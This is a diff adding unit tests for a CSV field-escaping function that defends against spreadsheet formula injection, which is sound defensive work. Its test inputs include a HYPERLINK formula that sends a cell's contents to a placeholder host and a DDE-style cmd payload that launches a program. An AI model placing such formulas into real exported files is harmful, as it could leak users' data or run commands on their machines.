@@ -63,6 +63,33 @@ describe('escaping a field', () => {
   });
 });
 
+describe('formulas in a field', () => {
+  // A source row is data anyone may have typed. Opened in a spreadsheet, a
+  // cell starting with = + - @ (or a tab/CR) runs as a formula, quoted or not.
+  it('turns text a spreadsheet would run into text, with a leading quote', () => {
+    expect(escapeField('=HYPERLINK("http://x/?"&A1,"open")', ',', '\n')).toBe(
+      `"'=HYPERLINK(""http://x/?""&A1,""open"")"`,
+    );
+    expect(escapeField("+cmd|' /C calc'!A0", ',', '\n')).toBe("'+cmd|' /C calc'!A0");
+    expect(escapeField('@SUM(A1:A9)', ',', '\n')).toBe("'@SUM(A1:A9)");
+    expect(escapeField('-2+3', ',', '\n')).toBe("'-2+3");
+    expect(escapeField('\t=1+1', ',', '\n')).toBe("'\t=1+1");
+    // A leading space is not a barrier: spreadsheets skip it and still run the formula.
+    expect(escapeField(' =HYPERLINK("http://x")', ',', '\n')).toBe(`"' =HYPERLINK(""http://x"")"`);
+  });
+
+  it('leaves a number, signed or not, as a number', () => {
+    // Drivers hand NUMERIC and BIGINT over as strings; a quote would make them text.
+    for (const value of [-5, '-5.00', '+1.5e3', '-.5', 42, ' -5']) {
+      expect(escapeField(value, ',', '\n')).toBe(String(value));
+    }
+  });
+
+  it('writes the value as it is when the sink opts out', () => {
+    expect(escapeField('=1+1', ',', '\n', false)).toBe('=1+1');
+  });
+});
+
 describe('writing the file', () => {
   const config = (path: string, extra: Record<string, unknown> = {}) => ({
     path,
@@ -82,6 +109,19 @@ describe('writing the file', () => {
     );
 
     expect(await readFile(path, 'utf8')).toBe('name,outcome\nDana,callback\n');
+  });
+
+  it('neutralizes a formula in a row it writes, unless told not to', async () => {
+    const path = await tempPath();
+    await new FileSinkPipe().write(batch([{ name: '=HYPERLINK("http://x")', outcome: '-3' }]), contextFor(config(path)));
+    expect(await readFile(path, 'utf8')).toBe(`name,outcome\n"'=HYPERLINK(""http://x"")",-3\n`);
+
+    const raw = await tempPath();
+    await new FileSinkPipe().write(
+      batch([{ name: '=1+1', outcome: 'sold' }]),
+      contextFor(config(raw, { escapeFormulas: false })),
+    );
+    expect(await readFile(raw, 'utf8')).toBe('name,outcome\n=1+1,sold\n');
   });
 
   it('appends across batches without repeating the header', async () => {
